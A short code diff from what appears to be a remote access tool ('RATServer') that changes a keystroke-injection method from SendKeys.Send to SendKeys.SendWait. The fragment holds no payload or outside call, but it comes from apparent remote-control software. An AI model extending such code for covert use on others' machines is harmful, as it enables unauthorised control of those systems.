@@ -58,7 +58,7 @@ namespace RATServer
         }
         public static void KeyPress(string Keys)
         {
-            SendKeys.Send(Keys);
+            SendKeys.SendWait(Keys);
         }
     }
 }
